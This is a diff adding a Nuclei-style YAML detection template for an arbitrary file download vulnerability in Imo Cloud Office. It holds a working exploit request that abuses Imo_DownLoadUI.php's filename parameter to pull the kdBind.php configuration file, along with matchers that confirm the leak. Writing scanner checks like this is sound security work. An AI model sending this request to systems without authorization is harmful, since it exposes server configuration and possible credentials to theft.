@@ -1,0 +1,26 @@
+id: poc-yaml-imo-imo-downloadui-fileread
+info:
+  name: Imo Cloud Office Arbitrary File Download Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Vulnerability in Imo Cloud Office interface Imo_DownLoadUI.php allowing arbitrary file download.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<?php"
+          - "$bindInfo"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
